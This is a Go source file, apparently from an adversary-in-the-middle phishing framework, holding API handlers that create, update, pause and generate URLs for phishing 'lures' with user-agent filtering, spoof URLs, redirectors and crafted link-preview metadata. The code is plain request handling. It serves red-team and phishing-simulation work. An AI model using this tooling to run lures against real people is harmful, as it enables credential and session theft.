package api

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"time"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/sdk"
)

func (r *Router) listLures(w http.ResponseWriter, req *http.Request) {
	limit, offset := parsePagination(req)
	phishlet := req.URL.Query().Get("phishlet")

	all, err := r.lures.List()
	if err != nil {
		writeError(w, http.StatusInternalServerError, err.Error(), "INTERNAL_ERROR")
		return
	}

	var filtered []*aitm.Lure
	for _, l := range all {
		if phishlet == "" || l.Phishlet == phishlet {
			filtered = append(filtered, l)
		}
	}

	total := len(filtered)
	start := min(offset, total)
	end := min(start+limit, total)
	page := filtered[start:end]

	items := make([]sdk.LureResponse, len(page))
	for i, l := range page {
		items[i] = lureToResponse(l)
	}
	writeJSON(w, http.StatusOK, sdk.PaginatedResponse[sdk.LureResponse]{
		Items:  items,
		Total:  total,
		Limit:  limit,
		Offset: offset,
	})
}

func (r *Router) createLure(w http.ResponseWriter, req *http.Request) {
	var body sdk.CreateLureRequest
	if err := json.NewDecoder(req.Body).Decode(&body); err != nil {
		writeError(w, http.StatusUnprocessableEntity, "invalid request body", "VALIDATION_ERROR")
		return
	}
	if body.Phishlet == "" {
		writeError(w, http.StatusUnprocessableEntity, "phishlet: required", "VALIDATION_ERROR")
		return
	}
	if body.UAFilter != "" {
		if _, err := regexp.Compile(body.UAFilter); err != nil {
			writeError(w, http.StatusUnprocessableEntity, "ua_filter: invalid regex: "+err.Error(), "VALIDATION_ERROR")
			return
		}
	}
	if err := validateURL("redirect_url", body.RedirectURL); err != nil {
		writeError(w, http.StatusUnprocessableEntity, err.Error(), "VALIDATION_ERROR")
		return
	}
	if err := validateURL("spoof_url", body.SpoofURL); err != nil {
		writeError(w, http.StatusUnprocessableEntity, err.Error(), "VALIDATION_ERROR")
		return
	}

	path := body.Path
	if path == "" {
		path = randomPath()
	}

	lure := &aitm.Lure{
		Phishlet:    body.Phishlet,
		BaseDomain:  body.BaseDomain,
		Path:        path,
		RedirectURL: body.RedirectURL,
		SpoofURL:    body.SpoofURL,
		UAFilter:    body.UAFilter,
		OGTitle:     body.OGTitle,
		OGDesc:      body.OGDesc,
		OGImage:     body.OGImage,
		OGURL:       body.OGURL,
		Redirector:  body.Redirector,
	}
	if err := r.lures.Create(lure); err != nil {
		status, code := errStatus(err)
		writeError(w, status, err.Error(), code)
		return
	}
	writeJSON(w, http.StatusCreated, lureToResponse(lure))
}

func (r *Router) updateLure(w http.ResponseWriter, req *http.Request) {
	id := req.PathValue("id")
	lure, err := r.lures.Get(id)
	if err != nil {
		status, code := errStatus(err)
		writeError(w, status, "lure not found", code)
		return
	}

	var body sdk.UpdateLureRequest
	if err := json.NewDecoder(req.Body).Decode(&body); err != nil {
		writeError(w, http.StatusUnprocessableEntity, "invalid request body", "VALIDATION_ERROR")
		return
	}
	if body.UAFilter != nil {
		if _, err := regexp.Compile(*body.UAFilter); err != nil {
			writeError(w, http.StatusUnprocessableEntity, "ua_filter: invalid regex: "+err.Error(), "VALIDATION_ERROR")
			return
		}
		lure.UAFilter = *body.UAFilter
	}
	if body.RedirectURL != nil {
		if err := validateURL("redirect_url", *body.RedirectURL); err != nil {
			writeError(w, http.StatusUnprocessableEntity, err.Error(), "VALIDATION_ERROR")
			return
		}
		lure.RedirectURL = *body.RedirectURL
	}
	if body.SpoofURL != nil {
		if err := validateURL("spoof_url", *body.SpoofURL); err != nil {
			writeError(w, http.StatusUnprocessableEntity, err.Error(), "VALIDATION_ERROR")
			return
		}
		lure.SpoofURL = *body.SpoofURL
	}
	if body.OGTitle != nil {
		lure.OGTitle = *body.OGTitle
	}
	if body.OGDesc != nil {
		lure.OGDesc = *body.OGDesc
	}
	if body.OGImage != nil {
		lure.OGImage = *body.OGImage
	}
	if body.OGURL != nil {
		lure.OGURL = *body.OGURL
	}
	if body.Redirector != nil {
		lure.Redirector = *body.Redirector
	}

	if err := r.lures.Update(lure); err != nil {
		status, code := errStatus(err)
		writeError(w, status, err.Error(), code)
		return
	}
	writeJSON(w, http.StatusOK, lureToResponse(lure))
}

func (r *Router) deleteLure(w http.ResponseWriter, req *http.Request) {
	id := req.PathValue("id")
	if err := r.lures.Delete(id); err != nil {
		status, code := errStatus(err)
		writeError(w, status, err.Error(), code)
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

func (r *Router) generateLureURL(w http.ResponseWriter, req *http.Request) {
	id := req.PathValue("id")
	lure, err := r.lures.Get(id)
	if err != nil {
		status, code := errStatus(err)
		writeError(w, status, "lure not found", code)
		return
	}

	var body sdk.GenerateURLRequest
	// Body is optional; ignore decode errors.
	json.NewDecoder(req.Body).Decode(&body)

	url, err := lure.GenerateURL(r.domain, body.Params)
	if err != nil {
		writeError(w, http.StatusInternalServerError, err.Error(), "INTERNAL_ERROR")
		return
	}
	writeJSON(w, http.StatusOK, sdk.GenerateURLResponse{URL: url})
}

func (r *Router) pauseLure(w http.ResponseWriter, req *http.Request) {
	id := req.PathValue("id")

	var body sdk.PauseLureRequest
	if err := json.NewDecoder(req.Body).Decode(&body); err != nil {
		writeError(w, http.StatusUnprocessableEntity, "invalid request body", "VALIDATION_ERROR")
		return
	}
	d, err := time.ParseDuration(body.Duration)
	if err != nil {
		writeError(w, http.StatusUnprocessableEntity, "duration: invalid Go duration string", "VALIDATION_ERROR")
		return
	}

	if err := r.lures.Pause(id, d); err != nil {
		status, code := errStatus(err)
		writeError(w, status, err.Error(), code)
		return
	}
	lure, _ := r.lures.Get(id)
	writeJSON(w, http.StatusOK, lureToResponse(lure))
}

func (r *Router) unpauseLure(w http.ResponseWriter, req *http.Request) {
	id := req.PathValue("id")
	if err := r.lures.Unpause(id); err != nil {
		status, code := errStatus(err)
		writeError(w, status, err.Error(), code)
		return
	}
	lure, _ := r.lures.Get(id)
	writeJSON(w, http.StatusOK, lureToResponse(lure))
}

func lureToResponse(l *aitm.Lure) sdk.LureResponse {
	return sdk.LureResponse{
		ID:          l.ID,
		Phishlet:    l.Phishlet,
		BaseDomain:  l.BaseDomain,
		Hostname:    l.Hostname,
		Path:        l.Path,
		RedirectURL: l.RedirectURL,
		SpoofURL:    l.SpoofURL,
		UAFilter:    l.UAFilter,
		PausedUntil: pausedUntil(l),
		OGTitle:     l.OGTitle,
		OGDesc:      l.OGDesc,
		OGImage:     l.OGImage,
		OGURL:       l.OGURL,
		Redirector:  l.Redirector,
	}
}

func pausedUntil(l *aitm.Lure) *time.Time {
	if l.PausedUntil.IsZero() {
		return nil
	}
	return &l.PausedUntil
}

// validateURL returns an error if s is non-empty but not a valid absolute HTTP/HTTPS URL.
func validateURL(field, s string) error {
	if s == "" {
		return nil
	}
	u, err := url.ParseRequestURI(s)
	if err != nil || (u.Scheme != "http" && u.Scheme != "https") {
		return fmt.Errorf("%s: must be an absolute http or https URL", field)
	}
	return nil
}

func randomPath() string {
	b := make([]byte, 6)
	rand.Read(b)
	return "/" + hex.EncodeToString(b)
}
